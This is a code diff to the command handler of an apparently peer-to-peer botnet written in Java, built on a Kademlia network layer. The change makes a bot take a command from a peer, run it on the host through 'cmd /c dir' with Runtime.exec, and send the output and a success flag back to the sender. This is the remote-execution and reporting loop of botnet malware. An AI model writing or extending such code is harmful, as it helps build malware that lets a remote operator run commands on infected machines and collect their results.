@@ -1,5 +1,7 @@
 package botnet_p2p.business_logic_layer;
 
+import botnet_p2p.model.KademliaPeer;
+import botnet_p2p.p2p_layer.P2pLayer;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.apache.logging.log4j.core.util.IOUtils;
@@ -12,23 +14,44 @@ import static botnet_p2p.MessageOuterClass.Message;
 
 class BotMessageHandler {
     private static final Logger logger = LogManager.getLogger(BusinessLogicLayer.class);
+    private P2pLayer p2pLayer;
+    private KademliaPeer me;
 
-    void handleCommandMessage(Message messsage) {
-        String command = messsage.getCommand().getCommandString();
+    BotMessageHandler(P2pLayer p2pLayer, KademliaPeer me) {
+        this.p2pLayer = p2pLayer;
+        this.me = me;
+    }
+
+    public BotMessageHandler() {
+    }
+
+    void handleCommandMessage(Message message) {
+        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());
+        String command = message.getCommand().getCommandString();
 
         logger.info("executing command: " + command);
-        executeCommand(command);
-
-
+        String result = executeCommand(command);
+        boolean success = true;
+        if(result == null) {
+            result = "";
+            success = false;
+        }
+        p2pLayer.commandResponse(sender, me, result, success);
     }
 
     String executeCommand(String command) {
-        if("dir".equals(command)) {
+        if ("dir".equals(command)) {
             try {
-                InputStreamReader i = new InputStreamReader(Runtime.getRuntime().exec("cmd /c dir").getInputStream());
+                Process exec = Runtime.getRuntime().exec("cmd /c dir");
+                exec.waitFor();
+                if(exec.exitValue() != 0) {
+                    return null;
+                }
+                InputStreamReader i = new InputStreamReader(exec.getInputStream());
                 return IOUtils.toString(i);
-            } catch (IOException e) {
+            } catch (IOException | InterruptedException e) {
                 e.printStackTrace();
+                return null;
             }
         }
         return null;
